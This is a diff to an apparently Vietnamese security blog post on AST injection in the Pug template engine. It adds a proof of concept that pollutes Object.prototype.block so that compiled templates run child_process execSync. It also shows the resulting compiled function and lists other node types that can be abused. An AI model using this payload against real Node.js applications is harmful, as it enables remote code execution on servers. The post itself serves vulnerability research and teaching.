@@ -35,7 +35,7 @@
                             "url": "https:\/\/n00b-bot.github.io\/images\/Apple-Devices-Preview.png",
                             "width":  3200 ,
                             "height":  2048 
-                        }],"genre": "posts","wordcount":  845 ,
+                        }],"genre": "posts","wordcount":  1240 ,
         "url": "https:\/\/n00b-bot.github.io\/ast-injection\/","datePublished": "2022-11-06T10:55:32+07:00","dateModified": "2022-11-07T00:03:41+07:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "xxxx","logo": "https:\/\/n00b-bot.github.io\/images\/avatar.png1"},"author": {
@@ -109,8 +109,8 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">AST Injection</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="https://github.com/n00b-bot" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Nothing</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-11-06">2022-11-06</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;845 words&nbsp;
-                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;<span id="/ast-injection/" class="leancloud_visitors" data-flag-title="AST Injection">
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-11-06">2022-11-06</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1240 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;6 minutes&nbsp;<span id="/ast-injection/" class="leancloud_visitors" data-flag-title="AST Injection">
                         <i class="far fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
                     </span>&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="">
@@ -425,12 +425,121 @@ AST được sử dụng thường xuyên trong JS ví dụ như: template engin
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Object.prototype.block = {&#34;type&#34;: &#34;Text&#34;, &#34;line&#34;: &#34;console.log(process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;).toString())&#34;};
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">const pug = require(&#39;pug&#39;);
+</span></span><span class="line"><span class="cl">Object.prototype.block = {&#34;type&#34;: &#34;Text&#34;, &#34;line&#34;: &#34;console.log(process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;).toString())&#34;};
+</span></span><span class="line"><span class="cl">pug.compile(&#39;h1= msg&#39;, {debug:true});
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>Tại sao ở đây lại chọn Text mà không phải các type khác:</p>
+</div><p>Template Function được trả về đã được injection</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Compiled Function:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  function template(locals) {var pug_html = &#34;&#34;, pug_mixins = {}, pug_interp;var pug_debug_filename, pug_debug_line;try {;
+</span></span><span class="line"><span class="cl">      var locals_for_with = (locals || {});
+</span></span><span class="line"><span class="cl">      
+</span></span><span class="line"><span class="cl">      (function (console, msg, process) {
+</span></span><span class="line"><span class="cl">        ;pug_debug_line = 1;
+</span></span><span class="line"><span class="cl">  pug_html = pug_html + &#34;\u003Ch1\u003E&#34;;
+</span></span><span class="line"><span class="cl">  ;pug_debug_line = 1;
+</span></span><span class="line"><span class="cl">  pug_html = pug_html + (pug.escape(null == (pug_interp = msg) ? &#34;&#34; : pug_interp));
+</span></span><span class="line"><span class="cl">  ;pug_debug_line = console.log(process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;).toString());
+</span></span><span class="line"><span class="cl">  pug_html = pug_html + &#34;ndefine\u003C\u002Fh1\u003E&#34;;
+</span></span><span class="line"><span class="cl">      }.call(this, &#34;console&#34; in locals_for_with ?
+</span></span><span class="line"><span class="cl">          locals_for_with.console :
+</span></span><span class="line"><span class="cl">          typeof console !== &#39;undefined&#39; ? console : undefined, &#34;msg&#34; in locals_for_with ?
+</span></span><span class="line"><span class="cl">          locals_for_with.msg :
+</span></span><span class="line"><span class="cl">          typeof msg !== &#39;undefined&#39; ? msg : undefined, &#34;process&#34; in locals_for_with ?
+</span></span><span class="line"><span class="cl">          locals_for_with.process :
+</span></span><span class="line"><span class="cl">          typeof process !== &#39;undefined&#39; ? process : undefined));
+</span></span><span class="line"><span class="cl">      ;} catch (err) {pug.rethrow(err, pug_debug_filename, pug_debug_line);};return pug_html;}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Lúc này trong đầu mình có câu hỏi tại sao lại là type Text chứ không phải các type khác và liệu có type nào còn có thể khai thác được không.
+Sau 1 hồi debug thì mình tìm ra được các type có thể lợi dụng cần phải thỏa mãn 2 điều kiện:</p>
+<ul>
+<li>Có hàm visit<em>Type</em> (visitCode, visitTag, ..)</li>
+<li>Thuộc các case sau để tránh gọi đến hàm walkAST 1 lần nữa và mình tìm thêm được 1 số type hợp lệ.</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    case &#39;Attrs&#39;:
+</span></span><span class="line"><span class="cl">    case &#39;BlockComment&#39;: // work
+</span></span><span class="line"><span class="cl">    case &#39;Comment&#39;: // work
+</span></span><span class="line"><span class="cl">    case &#39;Doctype&#39;: // work
+</span></span><span class="line"><span class="cl">    case &#39;IncludeFilter&#39;:
+</span></span><span class="line"><span class="cl">    case &#39;MixinBlock&#39;: // work
+</span></span><span class="line"><span class="cl">    case &#39;YieldBlock&#39;: // work 
+</span></span><span class="line"><span class="cl">    case &#39;Text&#39;: // 
+</span></span><span class="line"><span class="cl">      break;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Liệu payload trên có hoạt động với mọi template không? =&gt; Câu trả lời là không nếu template không tham chiếu đến giá trị nhận từ argument.( điều này khó xảy ra vì nếu không tham chiếu đến đến các biến được truyền vào thì đã không sử dụng template từ ban đầu)
+Ví dụ về một template mà payload trên không hoạt động.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pug.compile(&#39;h1&#39;, {debug:true})
+</span></span><span class="line"><span class="cl">----------------------------------
+</span></span><span class="line"><span class="cl">Compiled Function:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  function template(locals) {var pug_html = &#34;&#34;, pug_mixins = {}, pug_interp;var pug_debug_filename, pug_debug_line;try {;pug_debug_line = 1;
+</span></span><span class="line"><span class="cl">  pug_html = pug_html + &#34;\u003Ch1\u003E\u003C\u002Fh1\u003E&#34;;} catch (err) {pug.rethrow(err, pug_debug_filename, pug_debug_line);};return pug_html;}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Tuy nhiên mình phát hiện ngay cả trong trường hợp trên, ta vẫn có thể khai thác được cũng bằng Prototype Pollution và mình để tự bạn tìm ra câu trả lời cho trường hợp trên. (dễ quá nó chán lắm 😂😂)
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/ast-injection/tem.png"
+        data-srcset="/ast-injection/tem.png, /ast-injection/tem.png 1.5x, /ast-injection/tem.png 2x"
+        data-sizes="auto"
+        alt="/ast-injection/tem.png"
+        title="/ast-injection/tem.png" width="1256" height="660" /></p>
 </div><div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
